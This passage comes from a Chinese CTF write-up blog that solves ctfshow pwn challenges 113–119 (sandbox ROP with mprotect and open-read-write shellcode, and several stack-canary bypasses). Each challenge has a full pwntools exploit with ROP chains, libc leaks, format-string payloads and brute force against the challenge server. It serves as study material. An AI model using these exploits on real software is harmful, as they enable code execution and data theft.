<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=OTViMzQxMjYxMDlhMDVkZjcxNWUyNmM4Zjk3ODg0NTdfRmFCU0k2TE1UV3VDZ2hidEVUMGZVaTRheU5vUTZqUUFfVG9rZW46WEZsQmJ1NnQzbzlER3R4UVJ3QmNmTndzbkNmXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>但是仅仅能看到文件信息，并不能获取到文件内容。[此时为本地运行]，至此，我们大概了解了这个程序的作用。</p>
<p>回到函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YWI0ZTMwN2ViNjMyOGUwMGJiNjcxY2YzNmU4MThhNGVfMmpKZ096T0dGanpWcVFLcnJFb3F4N1NBRHF0N1pQclVfVG9rZW46VDZrNGJuSlFtbzNTczV4c1VzVWNhWmJTbldhXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>这个函数能获取文件的各种属性</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YzJiZmU1Mzc3ZGNmNTEzMWQyNjUwYjhkNmRkZWFjODRfaTBRNVVLNEhPekVkbEtmbWdmTDdDN0JjdzBiQVAwb3dfVG9rZW46UTI2MmI4T0drb1pUOFl4Q0oxa2N5R0FXbnVkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>__xstat返回的其实是文件的stat结构体，里面会记录文件的类型和权限。用结构体里面的mode出来进行判断。</p>
<p>详细部分在课程中会进行讲解。</p>
<p>程序中有一个判断，当我们输入的文件路径有问题，它就会返回0，然后进入沙箱中，那么我们就可以任意输入，使其出错进入沙箱进行沙箱ROP，还是非常简单的。</p>
<p>先泄漏地址，再通过mprotect函数修改权限然后orw进行读flag，flag名称我们可以在远程连接的时候输入路径即可看到flag文件格式，详细过程这里不再概述见exp。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28251</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/bit/libc/64bit/libc-2.27.so&quot;</span>)</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401ba3</span> <span class="comment"># 0x0000000000401ba3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x418</span> + p8(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, payload)</span><br><span class="line">puts = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:] + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts)</span><br><span class="line">pause()</span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x418</span> + p8(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(elf.bss())</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi) + p64(elf.bss() &amp; <span class="number">0xfffffffffffff000</span>)</span><br><span class="line">payload += p64(libc_base + <span class="number">0x23e6a</span>) + p64(<span class="number">0x1000</span>)</span><br><span class="line">payload += p64(libc_base + <span class="number">0x1b96</span>)</span><br><span class="line">payload += p64(<span class="number">7</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]) + p64(elf.bss())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">mov eax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cmp eax, 0</span></span><br><span class="line"><span class="string">jg next</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">mov edi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edx, 4</span></span><br><span class="line"><span class="string">mov eax, edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">next:</span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edx, 0x100</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">mov edi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov eax, edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit:</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">mov eax, 231</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-114"><a href="#pwn-114" class="headerlink" title="pwn 114"></a>pwn 114</h2><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NTI5ODM3MjljZjk2YWI0NjBlZjBkZTMzMTRlMjI1ZmRfcDlqVWJWQnZCYjNlRmhqdU9QUFlZRTRUZFlXcnVEMHRfVG9rZW46TlEwWGJZTUdxb2M0dlN4VDNsaWNIUFhFbjNiXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位仅关闭Canary</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NTgzNGNhM2E0NjYyMGZmMjk4MTM5OTlhZDE4Mjg3MmNfd1QwZkw2QTRaZHd2VWhnUloyU1Jhd2ptaWg5WFlvWFFfVG9rZW46Q0RoT2IyUHd3b1lpQmN4UWpWamMyREZHbmdjXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<blockquote>
<p>这里的flagishere函数是一个后门函数，负责将flag读取到flag变量中，而在这之前有一个signal信号量处理函数，通过查看sigsegv_handler得知，在程序收到一个段错误时，程序会将flag变量输出</p>
</blockquote>
<p>跟进ctfshow():</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NjY5Y2M0ZTJlYjIxNjM1NWQyNDQ4YjVmMjk4NjNlNjRfaXk5Y2tBUWlBTGF3c1FuOWg0SFJaa1A2ZmZZekRmazNfVG9rZW46U2tWM2JZWXpwb3I3T3N4M1ZnUmNuZFpJbkpmXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<blockquote>
<p>这里我们可以看到我们的dest存在栈溢出问题，因此这里我们只需要输入大于0x100个字节的数据结果触发信号量处理函数，得到flag</p>
</blockquote>
<p>存在后门函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMwNjEyNTdjYWQxZGE5YTI5ZWQzYjY0ODJiNmUwOGJfVFFvOWl3eWlpclluUVNmNlcweTlRM1JtRExLdTI4ZXRfVG9rZW46U0JHUmJzZDZxbzBqdjl4ODRYTWM5VVF2bnBkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>非常简单，溢出后即可获得flag</p>
<p>甚至都不需要写exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28292</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;Yes&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x100</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Canary-bypass"><a href="#Canary-bypass" class="headerlink" title="Canary bypass"></a>Canary bypass</h1><h2 id="pwn-115"><a href="#pwn-115" class="headerlink" title="pwn 115"></a>pwn 115</h2><blockquote>
<p>覆盖截断字符获取canary</p>
</blockquote>
<p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502231415798.png"></p>
<p>32位开启了Canary保护与NX保护，部分开启RELRO保护</p>
<p>IDA查看main函数，直接跟进ctfshow函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502231416483.png"></p>
<p>明显的溢出漏洞还有格式化字符串漏洞，还观察到存在后门函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502231416475.png"></p>
<p>由于开启了Canary保护，我们首先得泄漏出Canary的值，然后再利用backdoor函数进行get shell（方式不唯一）</p>
<p>exp </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28128</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor = elf.sym[<span class="string">&quot;backdoor&quot;</span>] </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Try Bypass Me!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak Canary</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">200</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;A&quot;</span>*<span class="number">200</span>)</span><br><span class="line">Canary = u32(io.recv(<span class="number">4</span>)) - <span class="number">0xa</span> <span class="comment"># b&#x27;\xa&#x27; == &#x27;\n&#x27;</span></span><br><span class="line">log.info(<span class="string">&quot;Canary:&quot;</span>+<span class="built_in">hex</span>(Canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass Canary</span></span><br><span class="line">payload = <span class="string">&quot;\x90&quot;</span>*<span class="number">200</span> + p32(Canary)+<span class="string">&quot;\x90&quot;</span>*<span class="number">12</span> + p32(backdoor) </span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-116"><a href="#pwn-116" class="headerlink" title="pwn 116"></a>pwn 116</h2><blockquote>
<p>格式化字符串泄露canary</p>
</blockquote>
<p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502231413591.png"></p>
<p>32位开启了Canary保护与NX保护，部分开启RELRO保护</p>
<p>IDA查看ctfshow函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502231408834.png"></p>
<p>同样的存在溢出漏洞跟格式化字符串漏洞，且存在后门函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502231409596.png"></p>
<p>这次我们利用格式化字符串漏洞去泄漏Canary的值来进行绕过。</p>
<p>格式化字符串漏洞可以打印出栈中的内容，因此利用此漏洞可以打印出canary的值，再进行栈溢出。</p>
<p><code>printf</code>函数直接打印了<code>read</code>读取的用户输入的内容，因此我们可以通过输入特殊的payload来利用printf泄露栈中的内容。</p>
<p>exp </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)    </span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28182</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;qwerasd&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#print Canary</span></span><br><span class="line">p.sendline(<span class="string">&quot;%15$08x&quot;</span>)</span><br><span class="line">canary = io.recv()[:<span class="number">8</span>]                  <span class="comment">#获取返回的Canary，只取前8位，即去掉回车符</span></span><br><span class="line">Canary = canary.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">result = <span class="built_in">bytes</span>.fromhex(Canary)[::-<span class="number">1</span>] <span class="comment"># 转化成小端序</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#Payload</span></span><br><span class="line">canary_offset = <span class="number">8</span>*<span class="number">4</span></span><br><span class="line">ret_offset = <span class="number">3</span>*<span class="number">4</span></span><br><span class="line"><span class="comment">#Bypass Canary</span></span><br><span class="line">payload = canary_offset*<span class="string">&#x27;a&#x27;</span> + result + ret_offset*<span class="string">&#x27;b&#x27;</span> + p32(backdoor) </span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-117"><a href="#pwn-117" class="headerlink" title="pwn 117"></a>pwn 117</h2><blockquote>
<p>SSP Leak泄露canary</p>
</blockquote>
<p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502231352692.png"></p>
<p>64位开启了Canary保护与NX保护，部分开启RELRO保护</p>
<p>IDA查看main函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502231352452.png"></p>
<p>可以看到程序先以及读取了&#x2F;flag文件，然后可以看到buf在bss段，gets(v5)明显的栈溢出漏洞</p>
<p>canary检测失败时会调用stack_chk_fail函数，输出一段报错，报错会输出文件名，覆盖文件名指针，从而实现任意读，也就是覆盖变量__libc_argv[0]，这样我们就可以在canary检测失败时，输出我们想要的flag值：</p>
<p>flag（buf）地址为：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502231354487.png"></p>
<p>栈顶地址：</p>
<p><img src="C:\Users\LEGION\AppData\Roaming\Typora\typora-user-images\image-20250223135459451.png" alt="image-20250223135459451"></p>
<p>argv[0]位置：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502231401717.png"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28242</span>)</span><br><span class="line">flag = <span class="number">0x6020A0</span> <span class="comment">#buf</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Haha,It has reduced you a lot of difficulty!&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">504</span> + p64(flag)  // <span class="number">0x7fffffffdc28</span> - <span class="number">0x7fffffffda30</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里最让我困扰的是我开始在我的wsl2（ubuntu22.04）做时找到的栈顶地址一直是0x7fffffffda00，计算出来的偏移是552.因为一直没有考虑到libc版本的问题，所以在这里卡了很久。最终是将程序的libc版本改成libc-2.23解决问题</p>
</blockquote>
<h2 id="pwn-118"><a href="#pwn-118" class="headerlink" title="pwn 118"></a>pwn 118</h2><p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502241824726.png"></p>
<p>32位开启Canary与NX保护</p>
<p>IDA查看main函数，跟进ctfshow函数:</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502241824238.png"></p>
<p>还是明显的栈溢出漏洞跟格式化字符串漏洞，这次我们再换一种方式进行绕过</p>
<p>我们还是发现存在后门函数：</p>
<p><img src="C:\Users\LEGION\AppData\Roaming\Typora\typora-user-images\image-20250224182523906.png" alt="image-20250224182523906"></p>
<p>这次我们劫持__stack_chk_fail函数，由于这里存在后门函数能直接获取flag，那么我们只需要将其改写为get_flag函数的地址就可以了。</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28151</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_chk_fail_got = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">getflag = elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;stack_chk_fail_got: getflag&#125;)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 触发stack_chk_fail函数</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn-119"><a href="#pwn-119" class="headerlink" title="pwn 119"></a>pwn 119</h2><p>检查保护：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502241848386.png"></p>
<p>32位开启Canary与NX保护，部分开启RELRO保护</p>
<p>IDA查看main函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502241849885.png"></p>
<p>程序中存在fork函数，而且还是不断循环，跟进ctfshow函数：</p>
<p><img src="https://sanbox-1332327456.cos.ap-guangzhou.myqcloud.com/pic/202502241851095.png"></p>
<p>还是栈溢出漏洞，开启了Canary保护，因此我们需要先绕过保护</p>
<p>每次进程重启后的Canary是不同的，但是同一个进程中的Canary都是一样的。并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。因此我们可以考虑进行one by one 爆破</p>
<p>Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;../code/pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28233</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Try PWN Me!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;No.<span class="subst">&#123;i&#125;</span> index:<span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;current Canary: <span class="subst">&#123;canary + j.to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xC</span>) + canary + j.to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    text = p.recvuntil(<span class="string">&#x27;Try PWN Me!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    text_str = <span class="built_in">str</span>(text)</span><br><span class="line">    <span class="built_in">print</span>(text_str)</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> text_str):</span><br><span class="line">        <span class="built_in">print</span>(text_str)</span><br><span class="line">        log.success(<span class="string">f&quot;success: <span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line">        canary += j.to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="comment">#   print &quot;Canary: &quot; + canary</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(u32(canary)))</span><br><span class="line"><span class="comment"># canary = canary[::-1]</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>) + canary + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(backdoor)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这题其实总体难度并不大，逐个字节爆破就可以了，但是我在做的时候遇到了几个问题：首先就是python中的一些数据类型转化和编码问题，这里可以看一下这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53932372/article/details/120171733">文档</a>；其次就是我按照官方给到的WP写exp的时候，遇到了遍历完256次之后没有找到这一字节数据的情况（！！！），开始我还以为是我代码哪里写错了，最后我还直接用python2跑了一下官方的题解<a 